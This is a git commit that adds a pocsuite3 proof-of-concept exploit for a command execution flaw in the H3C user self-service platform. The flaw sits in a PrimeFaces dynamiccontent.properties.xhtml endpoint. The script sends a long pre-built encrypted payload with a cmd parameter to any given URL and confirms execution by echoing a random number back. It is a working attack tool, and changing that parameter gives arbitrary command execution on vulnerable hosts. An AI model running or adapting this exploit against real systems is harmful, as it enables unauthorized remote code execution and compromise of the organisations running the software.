3b314c09a6e018733093fd8fdeaaa6a5b4b92534
桜 <58284151+luck-ying@users.noreply.github.com>
2024-04-12 15:07:33 +0800

    Add files via upload

---
+++ H3C/H3C用户自助服务平台dynamiccontent_properties_xhtml.py
@@ -0,0 +1,88 @@
+'''
+Date: 2024-03-11 17:18:55
+LastEditTime: 2024-03-11 17:23:38
+FilePath: \H3C用户自助服务平台\H3C用户自助服务平台dynamiccontent_properties_xhtml.py
+Description: 
+
+Copyright (c) 2024 by ${git_name_email}, All Rights Reserved. 
+'''
+from collections import OrderedDict
+from urllib.parse import urljoin
+import re
+import random
+import string
+import base64
+from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict, OptString, VUL_TYPE
+from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY
+
+
+class POC(POCBase):
+    vulID = '0'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
+    version = '1'  #默认为1
+    author = ['']  #  PoC作者的大名
+    vulDate = '2024-03-11'  #漏洞公开的时间,不知道就写今天
+    createDate = '2024-03-11'  # 编写 PoC 的日期
+    updateDate = '2024-03-11'  # PoC 更新的时间,默认和编写时间一样
+    references = ['']  # 漏洞地址来源,0day不用写
+    name = ''  # PoC 名称
+    appPowerLink = 'http://www.synjones.com/index.html'  # 漏洞厂商主页地址
+    appName = 'H3C用户自助服务平台'  # 漏洞应用名称
+    appVersion = '''ALL'''  # 漏洞影响版本
+    vulType = VUL_TYPE.COMMAND_EXECUTION #漏洞类型,类型参考见 漏洞类型规范表
+    desc = '''
+        H3C用户自助服务平台dynamiccontent_properties_xhtml
+    '''
+
+  # 漏洞简要描述
+    samples = ['']  # 测试样列,就是用 PoC 测试成功的网站
+    install_requires = ['']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
+    pocDesc = '''
+    检测:pocsuite -r .\poc++.py -u url(-f url.txt) --verify 
+    '''
+    category = POC_CATEGORY.EXPLOITS.REMOTE
+
+    def _verify(self):
+        result = {}
+        #生成随机数
+        rand_str = str(random.randint(100000000000000, 999999999999999999999))
+        path = "/mselfservice/javax.faces.resource/dynamiccontent.properties.xhtml"
+        headers={
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36',
+            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
+            'Accept-Encoding': 'gzip, deflate',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            }
+        data ='pfdrt=sc&ln=primefaces&pfdrid=uMKljPgnOTVxmOB%2BH6%2FQEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVqupdmBV%2FKAe9gtw54DSQCl72JjEAsHTRvxAuJC%2B%2FIFzB8dhqyGafOLqDOqc4QwUqLOJ5KuwGRarsPnIcJJwQQ7fEGzDwgaD0Njf%2FcNrT5NsETV8ToCfDLgkzjKVoz1ghGlbYnrjgqWarDvBnuv%2BEo5hxA5sgRQcWsFs1aN0zI9h8ecWvxGVmreIAuWduuetMakDq7ccNwStDSn2W6c%2BGvDYH7pKUiyBaGv9gshhhVGunrKvtJmJf04rVOy%2BZLezLj6vK%2BpVFyKR7s8xN5Ol1tz%2FG0VTJWYtaIwJ8rcWJLtVeLnXMlEcKBqd4yAtVfQNLA5AYtNBHneYyGZKAGivVYteZzG1IiJBtuZjHlE3kaH2N2XDLcOJKfyM%2FcwqYIl9PUvfC2Xh63Wh4yCFKJZGA2W0bnzXs8jdjMQoiKZnZiqRyDqkr5PwWqW16%2FI7eog15OBl4Kco%2FVjHHu8Mzg5DOvNevzs7hejq6rdj4T4AEDVrPMQS0HaIH%2BN7wC8zMZWsCJkXkY8GDcnOjhiwhQEL0l68qrO%2BEb%2F60MLarNPqOIBhF3RWB25h3q3vyESuWGkcTjJLlYOxHVJh3VhCou7OICpx3NcTTdwaRLlw7sMIUbF%2FciVuZGssKeVT%2FgR3nyoGuEg3WdOdM5tLfIthl1ruwVeQ7FoUcFU6RhZd0TO88HRsYXfaaRyC5HiSzRNn2DpnyzBIaZ8GDmz8AtbXt57uuUPRgyhdbZjIJx%2FqFUj%2BDikXHLvbUMrMlNAqSFJpqoy%2FQywVdBmlVdx%2BvJelZEK%2BBwNF9J4p%2F1fQ8wJZL2LB9SnqxAKr5kdCs0H%2FvouGHAXJZ%2BJzx5gcCw5h6%2Fp3ZkZMnMhkPMGWYIhFyWSSQwm6zmSZh1vRKfGRYd36aiRKgf3AynLVfTvxqPzqFh8BJUZ5Mh3V9R6D%2FukinKlX99zSUlQaueU22fj2jCgzvbpYwBUpD6a6tEoModbqMSIr0r7kYpE3tWAaF0ww4INtv2zUoQCRKo5BqCZFyaXrLnj7oA6RGm7ziH6xlFrOxtRd%2BLylDFB3dcYIgZtZoaSMAV3pyNoOzHy%2B1UtHe1nL97jJUCjUEbIOUPn70hyab29iHYAf3%2B9h0aurkyJVR28jIQlF4nT0nZqpixP%2Fnc0zrGppyu8dFzMqSqhRJgIkRrETErXPQ9sl%2BzoSf6CNta5ssizanfqqCmbwcvJkAlnPCP5OJhVes7lKCMlGH%2BOwPjT2xMuT6zaTMu3UMXeTd7U8yImpSbwTLhqcbaygXt8hhGSn5Qr7UQymKkAZGNKHGBbHeBIrEdjnVphcw9L2BjmaE%2BlsjMhGqFH6XWP5GD8FeHFtuY8bz08F4Wjt5wAeUZQOI4rSTpzgssoS1vbjJGzFukA07ahU%3D&cmd=echo+'+rand_str+''
+        url = self.url + path
+        try:
+            resq = requests.post(url=url,headers=headers,data=data,verify=False,allow_redirects=False)
+            if rand_str in resq.text:
+                result['VerifyInfo'] = {}
+                result['VerifyInfo']['URL'] = url
+        except Exception as e:
+            return
+        return self.parse_output(result)
+
+    def _attack(self):
+        return self._verify()
+
+    def parse_attack(self, result):
+        output = Output(self)
+        if result:
+            output.success(result)
+        else:
+            output.fail('target is not vulnerable')
+        return output
+
+    def _shell(self):
+        return
+
+    def parse_output(self, result):
+        output = Output(self)
+        if result:
+            output.success(result)
+        else:
+            output.fail('target is not vulnerable')
+        return output
+    
+register_poc(POC)
